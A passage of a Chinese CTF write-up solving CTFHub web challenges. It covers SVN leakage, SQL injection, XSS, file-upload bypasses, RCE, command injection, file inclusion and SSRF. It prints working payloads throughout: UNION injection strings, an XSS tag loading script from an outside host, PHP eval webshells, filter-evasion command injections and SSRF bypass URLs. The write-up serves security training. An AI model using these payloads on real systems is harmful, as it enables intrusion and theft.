class="headerlink" title="什么是SVN?"></a>什么是SVN?</h5><p>SVN是subversion的缩写，是一个开放源代码的版本控制系统，通过采用分支管理系统的高效管理，简而言之就是用于多个人共同开发同一个项目，实现共享资源，实现最终集中式的管理。</p><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。<br>在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。</p><p>用到的工具：dvcs-ripper</p><p>用dirsearch跑了一下.svn发现确实有，可能方法不对，跑都跑不完</p><p>然后开始回归正常操作：</p><p>1.下载所需要的工具：</p><pre><code>git clone https://github.com/kost/dvcs-ripper /svn</code></pre><p>我这里是将它下载到svn目录里面</p><p>2.使用</p><pre><code>perl rip-svn.pl -u http://challenge-30d239a5f2b26f23.sandbox.ctfhub.com:10080/.svn/</code></pre><p>补充：需要注意的是，.svn是隐藏文件，在linux下必须ls -al才能看到。<br>3.根据题目的提示，Flag 在服务端旧版本的源代码中。<br>注意那个tree中的pristine，里面一般存储的是代码的历史版本。我们直接进入目录，然后读取文件就可以得到flag了</p><p>问题：该软件不能正常使用，需要配置组件（暂未解决）</p><h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>我的密码是admin123</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A51352_2.png" alt></p><h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><p>这个题看很特别，看别人wp上说：是通过网上搜索eyou的默认口令来进入网站</p><p><a href="https://blog.csdn.net/weixin_45785288/article/details/108274723" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45785288/article/details/108274723</a></p><p>考查的信息收集能力</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h3><h4 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1.检测注入点"></a>1.检测注入点</h4><p>输入1得到Data: ctfhub输入2得到Data：skill输入3没有回显，输入1 or 1=1也会显示1的内容这是直接显示出来了？</p><h4 id="2-构造注入语句"><a href="#2-构造注入语句" class="headerlink" title="2.构造注入语句"></a>2.构造注入语句</h4><h5 id="a-得到数据库"><a href="#a-得到数据库" class="headerlink" title="a.得到数据库"></a>a.得到数据库</h5><p>-1 union select 1,2</p><p>得到回显Data: 2</p><p>-1 union select 1,3</p><p>得到回显Data: 3</p><p>-1 union select 1,database()</p><p>回显Data: sqli（得到数据库）</p><h5 id="b-得到数据库里面的表"><a href="#b-得到数据库里面的表" class="headerlink" title="b.得到数据库里面的表"></a>b.得到数据库里面的表</h5><p>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=”sqli”</p><p>得到回显：</p><p>Data: news,flag</p><h5 id="c-爆列名"><a href="#c-爆列名" class="headerlink" title="c.爆列名"></a>c.爆列名</h5><p>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=”flag”</p><p>得到回显：</p><p>Data: flag</p><h5 id="d-爆字段"><a href="#d-爆字段" class="headerlink" title="d.爆字段"></a>d.爆字段</h5><p>-1 union select 1,group_concat(flag) from flag</p><p>得到回显：</p><p>Data: ctfhub{3040c5c414ba645535376218}</p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>就像整数型一样，但是区别于有单引号需要自己构造单引号语句来让其失效</p><h4 id="1-查看数据库的列数"><a href="#1-查看数据库的列数" class="headerlink" title="1.查看数据库的列数"></a>1.查看数据库的列数</h4><p>1’ order by 3 – ‘发现报错，那么改为2 ：1’ order by 2 – ‘得到回显</p><p>说明有两列</p><h4 id="2-联合查询"><a href="#2-联合查询" class="headerlink" title="2.联合查询"></a>2.联合查询</h4><h5 id="a-爆库名"><a href="#a-爆库名" class="headerlink" title="a.爆库名"></a>a.爆库名</h5><p>这是获取所有数据库的语句：</p><p>‘ union select 1,group_concat(schema_name) from information_schema.schemata – ‘</p><p>发现information_schema是一个数据库</p><p>‘ union select 1,database()#</p><p>得到了sqli</p><h5 id="b-爆表"><a href="#b-爆表" class="headerlink" title="b.爆表"></a>b.爆表</h5><p>‘ union select table_schema, group_concat(table_name) from information_schema.tables where table_schema=’sqli’ – ‘</p><h5 id="c-爆列名-1"><a href="#c-爆列名-1" class="headerlink" title="c.爆列名"></a>c.爆列名</h5><p>-1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’#</p><h5 id="d-爆字段-1"><a href="#d-爆字段-1" class="headerlink" title="d.爆字段"></a>d.爆字段</h5><p>‘ union select 1,group_concat(flag) from flag – ‘</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>利用xss platform平台创建一个xss反射型的脚本</p><pre><code>&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xs.sb/wnbP&gt;&lt;/sCrIpT&gt;</code></pre><p>没什么好记的操作很简单直接上大佬的wp</p><p><a href="https://blog.csdn.net/weixin_43486981/article/details/107974878" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43486981/article/details/107974878</a></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>一句话，一把梭</p><pre><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A52238_4.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A52238_5.png" alt></p><h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><p>与无验证的区别在于对于上传的文件格式的后缀有规定</p><p>所以：shell.php.png 安排只要保证能传上去就行了，同时抓包去掉.png保证蚁剑可以识别</p><p>然后重复一句话，一把梭操作即可</p><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>介绍：</p><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。</p><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p><p>理解：</p><p>看到这，明白了，就好比你即使上传的是png文件，但是通过htaccess文件的解析，你依然是php文件</p><p>大佬的代码：</p><p>//方法一 SetHandler application/x-httpd-php      //所有的文件当做php文件来解析 </p><p>//方法二 AddType application/x-httpd-php .png    //.png文件当作php文件解析</p><p>上传顺序：</p><p>先制作.htaccess再来shell.png（毕竟进行了前端验证）</p><p>1.AddType application/x-httpd-php .png</p><p>2.<?php @eval($_POST['666']);?>一句话，一把梭</p><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>引子：</p><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p><p>通过介绍可以看出来，这种类型的过滤不是针对文件后缀名，而是根据http响应头信息，所以一定要通过抓包进行分析：</p><p>如果直接传的话会出现下面结果：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51052_1.png" alt></p><p>但是如果将：</p><p>Content-Type: application/octet-stream</p><p>改为：</p><p>Content-Type: image/png</p><p>就会显示上传成功</p><p>然后一句话，一把梭</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h5><p>引子:</p><p><strong>%00截断的两个条件</strong></p><ul><li>php &lt; 5.3.4</li><li>magic_quotes_gpc = off</li></ul><p>木马的文件格式为：phpwebshell.php%00.jpg</p><p>但是这个题需要截断的地方不是从文件的后缀进行截断，而是在响应后信息进行修改</p><p><strong>分析源码：</strong></p><pre><code>if (!empty($_POST[&#39;submit&#39;])) {    $name = basename($_FILES[&#39;file&#39;][&#39;name&#39;]);    $info = pathinfo($name);    $ext = $info[&#39;extension&#39;];    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);    if (in_array($ext, $whitelist)) {        $des = $_GET[&#39;road&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)) {            echo &quot;&lt;script&gt;alert(&#39;上传成功&#39;)&lt;/script&gt;&quot;;        } else {            echo &quot;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;/script&gt;&quot;;        }    } else {        echo &quot;文件类型不匹配&quot;;    }}</code></pre><p>$_FILES 解释（搬自php手册）<br>$_FILES 数组内容如下:</p><p>$_FILES【‘myFile’][‘name’] 客户端文件的原名称。</p><p>$_FILES【‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。</p><p>$_FILES【‘myFile’][‘size’] 已上传文件的大小，单位为字节。</p><p>$_FILES【‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在 php.ini 的 upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。</p><p>$_FILES【‘myFile’][‘error’] 和该文件上传相关的错误代码。[‘error’] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在 PHP 4.3.0 之后变成了 PHP 常量。)</p><p>basename() 函数：返回路径中的文件名部分。<br>$_name 是上传的文件名加后缀<br>$_ext 得到的就是后缀名<br>重点就在 $des这个变量<br>得到的完整路径是 GET[‘road’]+随机数+日期加前面获得的后缀名看到这里基本可看出来，如果直接上传的话，文件是会被重新命名的，所以这里就有一个办法就是在</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51239_3.png" alt></p><p>这里为自己拟定一个文件名字，并且使用00截断后面自动生成的信息，这样就可以防止你上传的文件被认定为临时文件了</p><p>可以看到之前上传的文件都是被认定为临时文件：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51237_2.png" alt></p><p>最后上传的路径为/uoload/1.php然后一句话，一把梭</p><h5 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h5><p>直接不做修改的上传发现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51248_4.png" alt></p><p>php没了！！！</p><p>所以这里关于绕过，而且明显告诉是双写，那就：</p><p>shell.pphphp</p><p>成功了，一把梭（关于怎么绕过要自己不断尝试，即可）</p><h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>都说是文件头检查了，那肯定就是抓包啊</p><p>将文件改为这个</p><p>Content-Type: image/png</p><p>但是说我文件错误，是文件错误，那么就准备改文件，</p><pre><code>GIF89a&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>把随便一个图片用hex打开发现他头部信息就是这个GIF89a</p><p>然后继续上传准备一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51301_5.png" alt></p><p>success</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h3><p>题目：</p><pre><code>&lt;?phpif (isset($_REQUEST[&#39;cmd&#39;])) {    eval($_REQUEST[&quot;cmd&quot;]);} else {    highlight_file(__FILE__);}?&gt;</code></pre><ul><li>eval():该函数可以把字符串作为PHP代码执行</li><li>$_REQUEST[’’]:和GET和POST类似，不过反应速度比较慢</li></ul><p>大体意思是：判断cmd是否被设置，若cmd被赋值，则执行如下语句，否则就继续显示以上代码。<br>方法一：</p><p>eval($_REQUEST[“cmd”]);</p><p>通过蚁剑直接连接，密码cmd</p><p>方法二：</p><p>构造URL：?cmd=system(“ls”);</p><p>发现了index.php</p><p>继续构造?cmd=system(“cd /;ls”);</p><p>得到：bin boot dev etc flag_30765 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p><p>构造：</p><p>?cmd=system(“cd /;cat flag_30765”);</p><p>success</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><pre><code>&lt;?php// 关闭错误报告error_reporting(0);if (isset($_GET[&#39;file&#39;])) {//strpos — 查找字符串首次出现的位置    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) {        include $_GET[&quot;file&quot;];    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);}?&gt;</code></pre><p>函数解释：</p><pre><code>#函数查找字符串在另一字符串中第一次出现的位置（区分大小写） strpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);</code></pre><p>发现一个shell</p><pre><code>&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;预定义的 $_REQUEST 变量包含了 $_GET、$_POST 和 $_COOKIE 的内容$_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据$_REQUEST 变量既可以收集GET方法发送的数据，也可以接受POST方法接受的数据</code></pre><p>直接蚁剑吧，发现是txt文件，没办法连接</p><p>因为题目给出：</p><p>i have a <a href="shell.txt">shell</a>, how to use it ?</p><p>所以构造参数：</p><p><a href="http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt" target="_blank" rel="noopener">http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt</a></p><p>然后使用hackbar的postdata传参</p><p>ctfhub=system(‘ls’);</p><p>ctfhub=system(‘ls /‘);</p><p>ctfhub=system(‘cat /flag’);</p><p>得到flag</p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>题型：php伪协议</p><pre><code>php://input特点如下:1）、Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量$_POST2）、PHP不能识别的Content-Type类型的时候，会将http请求包中相应的数据填入变量$HTTP_RAW_POST_DATA3）、只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php://input，否则其它情况都会。填入的长度，由Coentent-Length指定。4）、只有Content-Type为application/x-www-data-urlencoded时，php://input数据才跟$_POST数据相一致。5）、php://input数据总是跟$HTTP_RAW_POST_DATA相同，但是php://input比$HTTP_RAW_POST_DATA更凑效，且不需要特殊设置php.ini6）、PHP会将PATH字段的query_path部分，填入全局变量$_GET。通常情况下，GET方法提交的http请求，body为空。总结起来就是，在用$_POST获取不到由APP或者一些接口的回调数据时,就用php://input试试</code></pre><p>题目：</p><pre><code>&lt;?phpif (isset($_GET[&#39;file&#39;])) {    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) {        include($_GET[&quot;file&quot;]);    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);}?&gt;&lt;hr&gt;i don&#39;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;i don&#39;t have shell, how to get flag? phpinfo</code></pre><p>这个应该也是get传参，开头的格式也是?file=,也就是说先对你输入的文件的前六个字符进行判断，如果是php://的话就执行一个php文件，如果不是就gg</p><p>搜索了一下发现这是属于php伪协议的一种类型：</p><p>php://input 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p><p>利用条件：</p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><pre><code>http:/xxx/index.php?file=php://input</code></pre><p>其他伪协议可见链接：</p><p><a href="https://blog.csdn.net/qiuyeyijian/article/details/102993218?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control" target="_blank" rel="noopener">https://blog.csdn.net/qiuyeyijian/article/details/102993218?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control</a> (很好的一个写给萌新wp的博主，更多伪协议见下方的推荐其他的文章)</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A51747_1.png" alt></p><p>然后则这样就可以了</p><p>补充一个语句：<?php system("find / -name flag*");?>用这个找挺方便的</p><h5 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h5><p>题目：</p><pre><code>&lt;?phperror_reporting(E_ALL);if (isset($_GET[&#39;file&#39;])) {    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) {        include($_GET[&quot;file&quot;]);    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);    //highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮，会显示规定要显示的文件}?&gt;&lt;hr&gt;i don&#39;t have shell, how to get flag? &lt;br&gt;flag in &lt;code&gt;/flag&lt;/code&gt;i don&#39;t have shell, how to get flag? flag in /flag</code></pre><p>和上一题一样我感觉，但是并不好用</p><pre><code>resource=&lt;要过滤的数据流&gt;            指定了你要筛选过滤的数据流。    必选read=&lt;读链的筛选列表&gt;             可以设定一个或多个过滤器名称，以管道符（|）分隔。    可选write=&lt;写链的筛选列表&gt;             可以设定一个或多个过滤器名称，以管道符（|）分隔。    可选&lt;；两个链的筛选列表&gt;               任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。</code></pre><p>这里就不能将指令POST上去了，图中又提示了必须使用<code>php://</code>，FLAG在/flag内，因此想到过滤器filter</p><p>考虑到php伪协议里面的直接读取一个文件里面的内容的一个伪协议↓</p><pre><code>?file=php://filter/read=convert.base64-encode/resource=/flag（有绝对路径的限制下只用）?file=php://filter/resource=/flag</code></pre><p>也可以去掉 <code>read</code>绕过一些限制函数</p><p>success</p><p>考查知识点：php://filter过滤器</p><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>题目：</p><pre><code>&lt;?phperror_reporting(0);if (isset($_GET[&#39;file&#39;])) {    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) {        include $_GET[&quot;file&quot;];    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);}?&gt;&lt;hr&gt;i don&#39;t have shell, how to get flag?&lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;i don&#39;t have shell, how to get flag?phpinfo</code></pre><p>也是：?file=来进行传参</p><p>让我看phpinfo文件，因为根据前面题总结的经验只要这个allow_url_include = On是开的就可以利用php://伪协议，点开phpinfo发现确实是开的，所以抓包试试，success</p><p>此题目和php://input做法一样</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>题目：</p><pre><code>&lt;?php$res = FALSE;if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {    $cmd = &quot;ping -c 4 {$_GET[&#39;ip&#39;]}&quot;;    exec($cmd, $res);}?&gt;</code></pre><p>输入框打入：127.0.0.1;ls</p><p>得到</p><pre><code>Array(    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes    [1] =&gt; 24024115330223.php    [2] =&gt; index.php)</code></pre><p>然后输入：127.0.0.1;cat 24024115330223.php</p><p>页面没有显示，但是在源代码里面显示了flag</p><h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><p>题目：</p><pre><code>&lt;?php$res = FALSE;if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {    $ip = $_GET[&#39;ip&#39;];    $m = [];    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) {        $cmd = &quot;ping -c 4 {$ip}&quot;;        exec($cmd, $res);    } else {        $res = $m;    }}?&gt;</code></pre><p>和上一题目一样，只不过要防一下过滤</p><p>127.0.0.1;a=ca;b=t;$a$b flag_29869689610883.php</p><p>不错不错新思路</p><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>在linux系统下：</p><p>1:&lt;&gt;  2:&lt;  3:${IFS}这三个均可以表示空格</p><p>所以</p><p>127.0.0.1;ls</p><p>127.0.0.1;cat&lt;flag_260652093720389.php</p><p>ybs</p><h4 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符:/\"></a>过滤目录分隔符:/\</h4><p>127.0.0.1;ls</p><p>127.0.0.1;cd flag_is_here;ls</p><p>127.0.0.1;cd flag_is_here;cat flag_25394867112070.php</p><p>也不知道为什么过滤，就好像过滤了一个寂寞</p><h4 id="过滤运算符-amp"><a href="#过滤运算符-amp" class="headerlink" title="过滤运算符:/(||\&amp;)/"></a>过滤运算符:/(||\&amp;)/</h4><p>127.0.0.1;ls</p><p>127.0.0.1;cat flag_13087279769836.php</p><p>这又是一个寂寞</p><h4 id="综合过滤练习：-amp-cat-flag-ctfhub"><a href="#综合过滤练习：-amp-cat-flag-ctfhub" class="headerlink" title="综合过滤练习：/(||&amp;|;| |\/|cat|flag|ctfhub)/"></a>综合过滤练习：/(||&amp;|;| |\/|cat|flag|ctfhub)/</h4><p>提示：%0a(换行符) 、%0d(回车符)</p><p>在这里的输入框输入：</p><p>127.0.0.1%0als</p><p>会发现，%0a会被两次编码，所以直接在URL里面输入才算可以</p><p>考虑到在linux系统内shell执行的并不能识别url编码，那么这里得知可以使用hex16位编码来进行转换：</p><p>使用命令$(printf${IFS}”hex编码”)</p><p>127.0.0.1%0als&lt;$(printf${IFS}”\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65”)</p><p>得到文件：</p><p>flag_144233033911102.php</p><p>构造:</p><p>127.0.0.1;cat flag_is_here/flag_144233033911102.php</p><p>127.0.0.1%0aca’’t${IFS}$(printf${IFS}”\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65\x2F\x66\x6C\x61\x67\x5F\x31\x34\x34\x32\x33\x33\x30\x33\x33\x39\x31\x31\x31\x30\x32\x2E\x70\x68\x70”)</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>题目信息：尝试访问位于127.0.0.1的flag.php吧</p><p>?url=127.0.0.1/flag.php</p><p>GG</p><h4 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h4><p>题目信息：尝试去读取一下Web目录下的flag.php吧</p><p>?url=file:///var/www/html/flag.php</p><p>查看源文件得flag</p><pre><code>URL伪协议：file://  本地文件传输协议，File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样dict://  Dict协议,字典服务器器协议,dict是基于查询响应的TCP协议,它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628gopher://  Gopher协议是互联网上使用的分布型的文件搜集获取网络协议。gopher协议是在HTTP协议出现之前,在internet上常见重用的协议,但是现在已经用的很少了sftp://  Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作ldap://  LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议tftp://  TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</code></pre><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>题目提示：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p><p>方法一（bp进行端口爆破）：</p><p>爆破格式为</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52212_2.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52213_3.png" alt></p><p>响应中查看</p><p>方法二：</p><pre><code>import requestsurl=&#39;http://challenge-48d05bc5759898a5.sandbox.ctfhub.com:10080/?url=127.0.0.1:&#39;port=8000while port&lt;=9000:    Wholeurl=url+str(port)    r = requests.get(Wholeurl)    print(Wholeurl)    if(len(r.content)!=0):        print(port)        print(r.content)        break    port=port+1print(&quot;over&quot;)</code></pre><p>py脚本进行爆破</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//QQ%E5%9B%BE%E7%89%8720210114112554.png" alt></p><p>（1/13基操↑）</p><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>提示：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>描述：请求的URL中必须包含<a href="http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧" target="_blank" rel="noopener">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p><p>?url=<a href="http://notfound.ctfhub.com@127.0.0.1/flag.php" target="_blank" rel="noopener">http://notfound.ctfhub.com@127.0.0.1/flag.php</a></p><h4 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h4><p>描述：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p><p><del>看了大佬的wp</del>：</p><ol><li>8进制格式：0177.00.00.01</li><li>16进制格式：0x7f.0x0.0x0.0x1</li><li>10进制整数格式：2130706433</li><li>在linux下，0代表127.0.0.1，<a href="http://0进行请求127.0.0.1" target="_blank" rel="noopener">http://0进行请求127.0.0.1</a></li></ol><p>?url=0/flag.php</p><h5 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h5><p>描述：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p><p>?url=127.0.0.1/flag.php</p><h6 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 